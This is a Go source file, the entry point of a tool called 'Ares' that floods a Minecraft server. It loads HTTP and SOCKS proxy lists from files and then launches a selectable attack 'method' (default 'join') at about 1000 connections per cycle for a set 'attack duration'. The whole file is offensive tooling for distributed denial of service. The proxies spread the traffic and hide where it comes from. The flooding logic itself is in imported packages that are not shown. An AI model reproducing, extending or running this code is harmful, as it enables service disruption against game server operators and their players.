package main

import (
	"Ares/core"
	"Ares/core/methods"
	"Ares/net/proxy"
	"Ares/utils"
	"flag"
	"fmt"
	"log"
	"time"
)

var (
	addr     = flag.String("addr", "0.0.0.0:25565", "Server address")
	protocol = flag.Int("protocol", 761, "Server Version Protocol Id")
	delay    = flag.Int("delay", 1, "Delay between each connection loop")
	perDelay = flag.Int("per", 1000, "Connections per Delay")
	loops    = flag.Int("loops", 1, "Method loops")
	method   = flag.String("method", "join", "Method name")
	duration = flag.Int("duration", 600, "attack duration")
)

func main() {
	flag.Parse()

	manager := core.ProxyManager{}
	err := utils.LoadFromFile(proxy.HTTP, 10*time.Second, "http.txt", &manager)
	if err != nil {
		log.Fatal(err)
	}

	err = utils.LoadFromFile(proxy.SOCKS4, 10*time.Second, "socks4.txt", &manager)
	if err != nil {
		log.Fatal(err)
	}

	err = utils.LoadFromFile(proxy.SOCKS5, 10*time.Second, "socks5.txt", &manager)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf("loaded %d proxies", manager.Length())

	conf := core.NewConfig(*addr, *protocol, &manager, *perDelay, time.Duration(*delay)*time.Second, *loops)

	methd, err := methods.GetMethod(*method, conf)
	if err != nil {
		log.Fatal(err)
	}

	methd.Start()

	time.Sleep(time.Duration(*duration) * time.Second)
}
